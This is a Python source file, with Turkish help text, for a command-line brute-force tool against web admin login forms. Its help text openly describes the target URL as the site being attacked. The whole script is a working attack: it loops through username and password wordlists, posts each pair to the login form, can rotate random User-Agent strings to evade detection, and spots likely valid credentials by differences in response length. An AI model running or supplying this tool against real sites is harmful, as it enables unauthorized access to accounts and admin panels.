from fake_useragent import UserAgent
from colorama import *
import argparse
import requests


def giris_yap(url, username, password, data, random_agent, timeout):
    data = data.replace("will", username)
    data = data.replace("graham", password)
    new_data = {}
    for veri in data.split("&"):
        new_data[veri.split("=")[0]] = veri.split("=")[1]
    if random_agent:
        headers = {
            "User-Agent": UserAgent().random
        }
    else:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
        }
    try:
        req = requests.post(url, data=new_data, timeout=timeout, headers=headers)
        return len(req.content)
    except KeyboardInterrupt:
        return True
    except:
        return False


def dosya_oku(kullanici_dosyasi, sifre_dosyasi):
    usernames = []
    with open(kullanici_dosyasi, "r", encoding="utf-8") as kullanicilar:
        for kullanici in kullanicilar.readlines():
            usernames.append(kullanici.strip())
    passwords = []
    with open(sifre_dosyasi, "r", encoding="utf-8") as sifreler:
        for sifre in sifreler.readlines():
            passwords.append(sifre.strip())
    return usernames, passwords


def parse_args():
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, add_help=False)
    parser._optionals.title = f"Parametreler\n{'='*50}"
    parser.add_argument('--help', action='help', default=argparse.SUPPRESS, help="Yardım sayfasını gösterir.")
    parser.add_argument('--url', default=None, metavar="", help="Saldırıyı yapacağınız sitenin admin panelini belirler.")
    parser.add_argument('--data', default=None, metavar="", help="Form veri kaynağı örn: username=will&password=graham&submit=submit")
    parser.add_argument('--timeout', default=25, metavar="", type=int, help="Web sitenin gecikme süresini belirler.")
    parser.add_argument('--usernames', default=None, metavar="", help="kullanıcı adı listesinin yolunu belirler.")
    parser.add_argument('--passwords', default=None, metavar="", help="Şifre listesinin yolunu belirler.")
    parser.add_argument('--random-agent', default=None, action='store_true',  help="Rastgele user-agent kullanmasını sağlar.")
    args = parser.parse_args()
    return args, parser


def main():
    args, parser = parse_args()
    if args.url != None and args.data != None and args.usernames != None and args.passwords != None:
        try:
            usernames, passwords = dosya_oku(args.usernames, args.passwords)
        except:
            parser.print_help()
        yanlis_uzunluk = giris_yap(args.url, "xxxxxxxxxx", "xxxxxxxxxx", args.data, args.random_agent, args.timeout)
        if type(yanlis_uzunluk) is not int:
            print(Fore.RED+"işlem sırasında bir hata oluştu!")
            exit()
        print(f"\n{Fore.MAGENTA}[{str(yanlis_uzunluk)}]{Fore.WHITE} Url={args.url} {Fore.RED}-{Fore.WHITE} Username=xxxxxxxxxx {Fore.RED}-{Fore.WHITE} Password=xxxxxxxxxx {Fore.WHITE}\n")
        for username in usernames:
            for password in passwords:
                uzunluk = giris_yap(args.url, username, password, args.data, args.random_agent, args.timeout)
                if type(uzunluk) is int:
                    if uzunluk != yanlis_uzunluk and uzunluk-len(username) != yanlis_uzunluk-10 and uzunluk-len(password) != yanlis_uzunluk-10 and uzunluk-(len(username) + len(password)) != yanlis_uzunluk-20:
                        print(f"{Fore.GREEN}[{str(uzunluk)}]{Fore.WHITE} Url={args.url} {Fore.GREEN}-{Fore.WHITE} Username={username} {Fore.GREEN}-{Fore.WHITE} Password={password}")
                    else:
                        print(f"{Fore.RED}[{str(uzunluk)}]{Fore.WHITE} Url={args.url} {Fore.RED}-{Fore.WHITE} Username={username} {Fore.RED}-{Fore.WHITE} Password={password}")
                elif uzunluk:
                    exit()
                else:
                    print(Fore.RED+"işlem sırasında bir hata oluştu!")
    else:
        parser.print_help()
        exit()


if __name__ == "__main__":
    try:
        init()
        main()
    except KeyboardInterrupt:
        exit()
